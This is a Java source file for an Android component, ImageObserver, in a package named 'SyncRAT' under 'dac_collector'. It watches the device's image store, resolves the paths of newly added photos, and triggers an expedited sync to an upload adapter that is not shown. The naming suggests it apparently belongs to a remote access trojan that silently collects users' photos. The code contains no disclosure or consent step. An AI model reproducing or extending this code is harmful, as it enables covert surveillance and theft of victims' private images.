// File: ImageObserver.java
package android.iocl.dac_collector.SyncRAT;

import android.accounts.Account;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Log;

import java.io.File;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

public class ImageObserver extends ContentObserver {
    private static final String TAG = "ImageObserver";
    private static final long SYNC_DELAY_MS = 1000; // 1-second debounce

    private final Context mContext;
    private final Handler mHandler;
    private final Set<Long> mPendingImageIds = new HashSet<>();
    private final Runnable mSyncRunnable = this::processPendingImages;

    public ImageObserver(Handler handler, Context context) {
        super(handler);
        this.mHandler = handler;
        this.mContext = context.getApplicationContext();
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);

        if (uri == null) return;
        String lastSegment = uri.getLastPathSegment();
        if (TextUtils.isEmpty(lastSegment) || !TextUtils.isDigitsOnly(lastSegment)) {
            Log.v(TAG, "Ignoring non-specific URI: " + uri);
            return;
        }

        long imageId = ContentUris.parseId(uri);
        synchronized (mPendingImageIds) {
            mPendingImageIds.add(imageId);
        }

        mHandler.removeCallbacks(mSyncRunnable);
        mHandler.postDelayed(mSyncRunnable, SYNC_DELAY_MS);
    }

    private void processPendingImages() {
        Set<Long> imageIds;
        synchronized (mPendingImageIds) {
            imageIds = new HashSet<>(mPendingImageIds);
            mPendingImageIds.clear();
        }

        if (imageIds.isEmpty()) return;

        String selection = MediaStore.Images.Media._ID + " IN (" +
                TextUtils.join(",", imageIds) + ")";
        String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.RELATIVE_PATH
        };

        try (Cursor cursor = mContext.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, null, null)) {

            if (cursor == null) {
                Log.w(TAG, "Cursor is null, skipping image processing.");
                return;
            }

            while (cursor.moveToNext()) {
                String fullPath = null;

                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    int dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                    if (dataIdx != -1) {
                        fullPath = cursor.getString(dataIdx);
                    }
                } else {
                    int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                    int pathIdx = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
                    if (nameIdx != -1 && pathIdx != -1) {
                        String name = cursor.getString(nameIdx);
                        String rel = cursor.getString(pathIdx);
                        fullPath = Environment.getExternalStorageDirectory()
                                + File.separator + rel + File.separator + name;
                    }
                }

                if (!TextUtils.isEmpty(fullPath)) {
                    File imgFile = new File(fullPath);
                    if (imgFile.exists()) {
                        triggerSync(fullPath);
                    } else {
                        Log.w(TAG, "File doesn't exist: " + fullPath);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to process images", e);
        }
    }

    private void triggerSync(String path) {
        Account account = SyncAccountUtil.getSyncAccount(mContext);
        if (account == null) {
            Log.e(TAG, "No sync account available.");
            return;
        }

        Bundle bundle = new Bundle();
        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
        bundle.putString(UploadSyncAdapter.EXTRA_IMG_PATH, path);

        Log.i(TAG, "Triggering sync for: " + path);
        ContentResolver.requestSync(account, Config.Sync.AUTHORITY, bundle);
    }

    /** Call in your Service/Application onCreate() */
    public void register() {
        mContext.getContentResolver().registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true, this);
        Log.i(TAG, "ImageObserver registered.");
    }

    /** Call in your Service/Application onDestroy() */
    public void unregister() {
        mContext.getContentResolver().unregisterContentObserver(this);
        Log.i(TAG, "ImageObserver unregistered.");
    }
}
